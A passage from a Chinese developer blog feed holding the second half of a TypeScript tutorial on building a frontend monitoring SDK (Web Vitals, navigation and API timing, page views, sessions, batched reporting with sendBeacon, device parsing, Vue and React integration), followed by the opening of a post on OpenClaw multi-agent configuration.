        <span class="hljs-attr">name</span>: <span class="hljs-string">'CLS'</span>,
        <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(clsValue * <span class="hljs-number">1000</span>) / <span class="hljs-number">1000</span>,
        <span class="hljs-attr">rating</span>: clsValue &lt;= <span class="hljs-number">0.1</span> ? <span class="hljs-string">'good'</span> : clsValue &lt;= <span class="hljs-number">0.25</span> ? <span class="hljs-string">'needs-improvement'</span> : <span class="hljs-string">'poor'</span>
      });
    }
  });
}
</code></pre>
<h5 data-id="heading-14">2.2 导航性能</h5>
<p>利用 Navigation Timing API 获取页面加载各阶段耗时：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">observeNavigation</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'load'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> navigation = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'navigation'</span>)[<span class="hljs-number">0</span>]
        <span class="hljs-keyword">as</span> <span class="hljs-title class_">PerformanceNavigationTiming</span>;

      <span class="hljs-keyword">const</span> metrics = [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'DNS'</span>, <span class="hljs-attr">value</span>: navigation.<span class="hljs-property">domainLookupEnd</span> - navigation.<span class="hljs-property">domainLookupStart</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'TCP'</span>, <span class="hljs-attr">value</span>: navigation.<span class="hljs-property">connectEnd</span> - navigation.<span class="hljs-property">connectStart</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'TTFB'</span>, <span class="hljs-attr">value</span>: navigation.<span class="hljs-property">responseStart</span> - navigation.<span class="hljs-property">startTime</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'DOM解析'</span>, <span class="hljs-attr">value</span>: navigation.<span class="hljs-property">domInteractive</span> - navigation.<span class="hljs-property">responseEnd</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">'Load'</span>, <span class="hljs-attr">value</span>: navigation.<span class="hljs-property">loadEventEnd</span> - navigation.<span class="hljs-property">startTime</span> }
      ];

      metrics.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">{ name, value }</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>) {
          reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'performance'</span>, {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'navigation'</span>,
            name,
            <span class="hljs-attr">value</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(value)
          });
        }
      });
    }, <span class="hljs-number">0</span>);
  });
}
</code></pre>
<h5 data-id="heading-15">2.3 API 耗时监控</h5>
<p>劫持 XMLHttpRequest 和 fetch，统计所有 API 请求耗时：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">observeAPI</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// 劫持 XMLHttpRequest</span>
  <span class="hljs-keyword">const</span> originalXHRSend = <span class="hljs-title class_">XMLHttpRequest</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">send</span>;

  <span class="hljs-title class_">XMLHttpRequest</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">send</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loadend'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> duration = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime;
      reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'performance'</span>, {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'api'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">`API: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>._url}</span>`</span>,
        <span class="hljs-attr">value</span>: duration
      });
    });

    <span class="hljs-keyword">return</span> originalXHRSend.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">arguments</span>);
  };

  <span class="hljs-comment">// 劫持 fetch...</span>
}
</code></pre>
<h4 data-id="heading-16">3. 访问监控模块</h4>
<h5 data-id="heading-17">3.1 PV 统计</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/visit/pv.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">observePV</span>(<span class="hljs-params">reporter: Reporter, enableSPA: <span class="hljs-built_in">boolean</span></span>): <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span> {
  <span class="hljs-comment">// 初始页面 PV</span>
  <span class="hljs-title function_">reportPV</span>(reporter);

  <span class="hljs-keyword">if</span> (!enableSPA) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 劫持 history API 监听路由变化</span>
  <span class="hljs-keyword">const</span> originalPushState = history.<span class="hljs-property">pushState</span>;
  history.<span class="hljs-property">pushState</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
    originalPushState.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
    <span class="hljs-title function_">reportPV</span>(reporter);
  };

  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'popstate'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reportPV</span>(reporter));
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'hashchange'</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reportPV</span>(reporter));
}
</code></pre>
<h5 data-id="heading-18">3.2 Session 管理</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/modules/visit/session.ts</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SESSION_TIMEOUT</span> = <span class="hljs-number">30</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>; <span class="hljs-comment">// 30分钟</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initSession</span>(<span class="hljs-params">reporter: Reporter</span>): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> startTime = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();

  <span class="hljs-comment">// 上报会话开始</span>
  reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'visit'</span>, { <span class="hljs-attr">type</span>: <span class="hljs-string">'session-start'</span> });

  <span class="hljs-comment">// 页面可见性变化</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'visibilitychange'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">'visible'</span>) {
      <span class="hljs-keyword">const</span> lastActive = <span class="hljs-built_in">parseInt</span>(storage.<span class="hljs-title function_">get</span>(<span class="hljs-string">'session_time'</span>) || <span class="hljs-string">'0'</span>);
      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - lastActive &gt; <span class="hljs-variable constant_">SESSION_TIMEOUT</span>) {
        <span class="hljs-comment">// 新会话</span>
        reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'visit'</span>, { <span class="hljs-attr">type</span>: <span class="hljs-string">'session-start'</span> });
      }
    } <span class="hljs-keyword">else</span> {
      storage.<span class="hljs-title function_">set</span>(<span class="hljs-string">'session_time'</span>, <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>());
    }
  });

  <span class="hljs-comment">// 页面卸载时上报会话结束</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, <span class="hljs-function">() =&gt;</span> {
    reporter.<span class="hljs-title function_">report</span>(<span class="hljs-string">'visit'</span>, {
      <span class="hljs-attr">type</span>: <span class="hljs-string">'session-end'</span>,
      <span class="hljs-attr">duration</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - startTime
    });
  });
}
</code></pre>
<h4 data-id="heading-19">4. 数据上报中心</h4>
<h5 data-id="heading-20">4.1 上报策略</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/core/reporter.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reporter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">queue</span>: <span class="hljs-title class_">QueueItem</span>[] = [];
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-variable constant_">FLUSH_INTERVAL</span> = <span class="hljs-number">5000</span>; <span class="hljs-comment">// 5秒刷新</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-variable constant_">MAX_QUEUE_SIZE</span> = <span class="hljs-number">10</span>;   <span class="hljs-comment">// 10条批量发送</span>

  <span class="hljs-title function_">report</span>(<span class="hljs-attr">type</span>: <span class="hljs-title class_">ReportData</span>[<span class="hljs-string">'type'</span>], <span class="hljs-attr">data</span>: <span class="hljs-title class_">ReportData</span>[<span class="hljs-string">'data'</span>]): <span class="hljs-built_in">void</span> {
    <span class="hljs-comment">// 采样检查</span>
    <span class="hljs-keyword">const</span> sampleRate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">sampleRate</span>?.[<span class="hljs-keyword">type</span>] || <span class="hljs-number">1</span>;
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">shouldSample</span>(sampleRate)) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> url = <span class="hljs-variable language_">this</span>.<span class="hljs-property">config</span>.<span class="hljs-property">reportUrl</span>[<span class="hljs-keyword">type</span>];
    <span class="hljs-keyword">if</span> (!url) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// 异常数据立即上报</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> === <span class="hljs-string">'error'</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">sendImmediately</span>(data, url);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 性能和访问数据批量上报</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addToQueue</span>(data, url);
    }
  }

  <span class="hljs-keyword">private</span> <span class="hljs-title function_">addToQueue</span>(<span class="hljs-attr">data</span>: <span class="hljs-title class_">ReportData</span>, <span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">push</span>({ data, url });

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">MAX_QUEUE_SIZE</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">flush</span>();
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">scheduleFlush</span>();
    }
  }
}
</code></pre>
<h5 data-id="heading-21">4.2 页面关闭补发</h5>
<p>使用 <code>sendBeacon</code> API 在页面关闭前发送剩余数据：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title function_">bindEvents</span>(): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">sendRemaining</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">queue</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">{ data, url }</span>) =&gt;</span> {
      navigator.<span class="hljs-property">sendBeacon</span>?.(url, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    });
  };

  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'beforeunload'</span>, sendRemaining);
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'visibilitychange'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">visibilityState</span> === <span class="hljs-string">'hidden'</span>) {
      <span class="hljs-title function_">sendRemaining</span>();
    }
  });
}
</code></pre>
<h4 data-id="heading-22">5. 设备信息解析</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/device.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getDeviceInfo</span>(<span class="hljs-params"/>): <span class="hljs-title class_">DeviceInfo</span> {
  <span class="hljs-keyword">const</span> ua = navigator.<span class="hljs-property">userAgent</span>;

  <span class="hljs-comment">// 解析操作系统</span>
  <span class="hljs-keyword">let</span> os = <span class="hljs-string">'unknown'</span>;
  <span class="hljs-keyword">let</span> osVersion = <span class="hljs-string">'unknown'</span>;

  <span class="hljs-keyword">if</span> (ua.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Win'</span>) !== -<span class="hljs-number">1</span>) {
    os = <span class="hljs-string">'Windows'</span>;
    <span class="hljs-keyword">const</span> match = ua.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/Windows NT (\d+\.\d+)/</span>);
    <span class="hljs-keyword">if</span> (match) osVersion = match[<span class="hljs-number">1</span>];
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ua.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Mac'</span>) !== -<span class="hljs-number">1</span>) {
    os = <span class="hljs-string">'macOS'</span>;
    <span class="hljs-comment">// ...</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/iPad|iPhone|iPod/</span>.<span class="hljs-title function_">test</span>(ua)) {
    os = <span class="hljs-string">'iOS'</span>;
    <span class="hljs-comment">// ...</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ua.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Android'</span>) !== -<span class="hljs-number">1</span>) {
    os = <span class="hljs-string">'Android'</span>;
    <span class="hljs-comment">// ...</span>
  }

  <span class="hljs-comment">// 解析浏览器</span>
  <span class="hljs-keyword">let</span> browser = <span class="hljs-string">'unknown'</span>;
  <span class="hljs-keyword">let</span> browserVersion = <span class="hljs-string">'unknown'</span>;

  <span class="hljs-keyword">if</span> (ua.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Chrome'</span>) !== -<span class="hljs-number">1</span> &amp;&amp; ua.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'Edg'</span>) === -<span class="hljs-number">1</span>) {
    browser = <span class="hljs-string">'Chrome'</span>;
    <span class="hljs-keyword">const</span> match = ua.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/Chrome\/(\d+\.\d+)/</span>);
    <span class="hljs-keyword">if</span> (match) browserVersion = match[<span class="hljs-number">1</span>];
  }
  <span class="hljs-comment">// ... Safari, Firefox, Edge</span>

  <span class="hljs-keyword">return</span> {
    ua,
    os,
    osVersion,
    browser,
    browserVersion,
    <span class="hljs-attr">screen</span>: <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">window</span>.screen.width}</span>x<span class="hljs-subst">${<span class="hljs-variable language_">window</span>.screen.height}</span>`</span>,
    <span class="hljs-attr">language</span>: navigator.<span class="hljs-property">language</span>
  };
}
</code></pre>
<hr/>
<h3 data-id="heading-23">使用示例</h3>
<h4 data-id="heading-24">基础使用</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Monitor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'frontend-monitor-sdk'</span>;

<span class="hljs-title class_">Monitor</span>.<span class="hljs-title function_">init</span>({
  <span class="hljs-attr">appId</span>: <span class="hljs-string">'my-app'</span>,
  <span class="hljs-attr">appVersion</span>: <span class="hljs-string">'1.0.0'</span>,
  <span class="hljs-attr">env</span>: <span class="hljs-string">'production'</span>,
  <span class="hljs-attr">reportUrl</span>: {
    <span class="hljs-attr">error</span>: <span class="hljs-string">'https://api.example.com/error'</span>,
    <span class="hljs-attr">performance</span>: <span class="hljs-string">'https://api.example.com/perf'</span>,
    <span class="hljs-attr">visit</span>: <span class="hljs-string">'https://api.example.com/visit'</span>
  },
  <span class="hljs-attr">sampleRate</span>: {
    <span class="hljs-attr">error</span>: <span class="hljs-number">1</span>,         <span class="hljs-comment">// 异常100%上报</span>
    <span class="hljs-attr">performance</span>: <span class="hljs-number">0.1</span>, <span class="hljs-comment">// 性能10%采样</span>
    <span class="hljs-attr">visit</span>: <span class="hljs-number">0.1</span>        <span class="hljs-comment">// 访问10%采样</span>
  },
  <span class="hljs-attr">enableSPA</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">beforeReport</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-comment">// 上报前钩子，可修改数据或返回 false 阻止上报</span>
    <span class="hljs-keyword">if</span> (data.<span class="hljs-property">type</span> === <span class="hljs-string">'error'</span> &amp;&amp; data.<span class="hljs-property">data</span>.<span class="hljs-property">message</span>?.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'ignore'</span>)) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-keyword">return</span> data;
  }
});
</code></pre>
<h4 data-id="heading-25">Vue 集成</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Monitor</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'frontend-monitor-sdk'</span>;

<span class="hljs-title class_">Monitor</span>.<span class="hljs-title function_">init</span>({ <span class="hljs-comment">/* ... */</span> });

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-property">config</span>.<span class="hljs-property">errorHandler</span> = <span class="hljs-title class_">Monitor</span>.<span class="hljs-property">vueErrorHandler</span>;
</code></pre>
<h4 data-id="heading-26">React 集成</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error: <span class="hljs-built_in">Error</span>, errorInfo: React.ErrorInfo</span>) {
    <span class="hljs-title class_">Monitor</span>.<span class="hljs-title function_">reportError</span>(error, {
      <span class="hljs-attr">componentStack</span>: errorInfo.<span class="hljs-property">componentStack</span>
    });
  }

  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-27">总结与展望</h3>
<h4 data-id="heading-28">已实现功能</h4>
<p>✅ <strong>异常监控</strong>：JS 错误、Promise 错误、资源错误、网络错误、控制台错误、框架错误
✅ <strong>性能监控</strong>：Web Vitals、导航计时、资源性能、API 耗时、长任务
✅ <strong>访问监控</strong>：PV/UV、Session、设备信息、SPA 路由监听
✅ <strong>数据上报</strong>：分类上报、采样控制、批量上报、页面关闭补发</p>
<h4 data-id="heading-29">技术亮点</h4>
<ol>
<li><strong>类型安全</strong>：完整的 TypeScript 类型定义</li>
<li><strong>模块化设计</strong>：各功能独立，可灵活组合</li>
<li><strong>低侵入性</strong>：自动捕获，业务代码零改动</li>
<li><strong>高兼容性</strong>：支持 ESM/CJS/UMD 多种格式</li>
</ol>
<h4 data-id="heading-30">未来优化方向</h4>
<p>🔲 <strong>SourceMap 解析</strong>：实现错误堆栈的源码还原
🔲 <strong>用户行为录屏</strong>：记录用户操作路径，辅助问题定位
🔲 <strong>性能面板可视化</strong>：开发 Chrome 插件查看性能数据
🔲 <strong>离线缓存</strong>：支持网络断开时的数据本地存储</p>
<hr/>
<h3 data-id="heading-31">参考资源</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FPerformance" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/Performance" ref="nofollow noopener noreferrer">MDN Performance API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fweb.dev%2Fvitals%2F" target="_blank" title="https://web.dev/vitals/" ref="nofollow noopener noreferrer">Google Web Vitals</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fw3c.github.io%2Fbeacon%2F" target="_blank" title="https://w3c.github.io/beacon/" ref="nofollow noopener noreferrer">W3C Beacon API</a></li>
</ul>
<hr/>
<p><em>本文完，如有问题欢迎留言讨论！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw 多 Agent 配置实战：踩坑指南与最佳实践]]></title>    <link>https://juejin.cn/post/7605810996125548578</link>    <guid>https://juejin.cn/post/7605810996125548578</guid>    <pubDate>2026-02-13T05:53:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605810996125548578" data-draft-id="7605816833191968768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw 多 Agent 配置实战：踩坑指南与最佳实践"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-13T05:53:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陈广亮"/> <meta itemprop="url" content="https://juejin.cn/user/3139860937575934"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw 多 Agent 配置实战：踩坑指南与最佳实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860937575934/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陈广亮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T05:53:58.000Z" title="Fri Feb 13 2026 05:53:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你已经用了一段时间 OpenClaw，肯定会遇到这样的需求：我需要一个专门写博客的 AI 助手，一个写小说的，一个做代码开发的……每个都有独立的角色定位、工作目录和配置。这就是多 Agent 配置要解决的问题。</p>
